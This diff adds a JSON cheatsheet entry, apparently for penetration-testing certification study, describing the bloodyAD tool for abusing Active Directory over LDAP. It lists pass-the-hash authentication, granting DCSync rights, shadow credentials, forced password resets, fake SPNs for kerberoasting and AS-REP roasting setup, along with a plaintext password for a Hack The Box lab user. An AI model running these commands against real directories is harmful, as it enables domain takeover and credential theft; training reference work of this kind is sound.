@@ -1,0 +1,59 @@
+{
+  "id": "ad-bloodyad-toolkit",
+  "name": "bloodyAD Toolkit (Linux AD Abuse Reference)",
+  "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> get writable",
+  "description": "Reference for bloodyAD - a Linux tool to enumerate and abuse AD objects over LDAP: find writable objects, add group members, set passwords, add DCSync rights, add shadow credentials, and set arbitrary attributes. Works with password, NT hash (-p :<hash>), or Kerberos (-k).",
+  "platform": "linux",
+  "type": "cheatsheet",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Tooling",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "HTB Fluffy engagement; bloodyAD",
+  "tags": [
+    "bloodyad",
+    "ldap",
+    "acl-abuse",
+    "toolkit",
+    "reference"
+  ],
+  "mitre": [
+    "T1098"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== AUTH FORMS ===\n  -u <user> -p <password>          # password\n  -u <user> -p :<nthash>           # pass-the-hash\n  -k                               # Kerberos (needs KRB5CCNAME + clock sync)\n  --host <dc_ip> -d <domain>       # always\n\n=== ENUMERATE ===\n  get writable                     # objects you can write (the money query)\n  get object <target> --attr <a>   # read attributes\n  get children --otype user        # list users\n  get search --filter '(objectClass=user)'\n\n=== ABUSE (add) ===\n  add groupMember \"<group>\" <user>             # -> ad-genericall-group\n  add dcsync <user>                            # -> ad-writedacl-linux\n  add shadowCredentials <target>               # -> ad-shadow-credentials\n  add computer 'EVIL$' 'Passw0rd!'             # add a computer (RBCD)\n  add uac <target> -f DONT_REQ_PREAUTH         # make AS-REP roastable\n\n=== ABUSE (set) ===\n  set password <target> '<new_password>'       # -> ad-force-change-password\n  set object <target> servicePrincipalName -v 'fake/svc'   # -> ad-targeted-kerberoast\n  set owner <target> <user>                     # take ownership (then WriteDACL)\n\n=== CLEANUP (remove) ===\n  remove groupMember \"<group>\" <user>\n  remove dcsync <user>\n  remove object <target> servicePrincipalName\n\nAlways clean up ACEs, SPNs, key credentials and added accounts you created.",
+  "examples": [
+    {
+      "label": "Find everything you can write",
+      "command": "bloodyAD --host 10.129.65.243 -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' get writable"
+    },
+    {
+      "label": "Pass-the-hash auth",
+      "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p :<nthash> get writable"
+    },
+    {
+      "label": "Add DCSync rights to yourself",
+      "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add dcsync <user>"
+    }
+  ],
+  "references": [
+    {
+      "title": "bloodyAD",
+      "url": "https://github.com/CravateRouge/bloodyAD"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-acl-decision-tree",
+      "note": "Map the writable edge you found to the right abuse.",
+      "rel": "next"
+    }
+  ],
+  "tools": [
+    "bloodyAD"
+  ]
+}
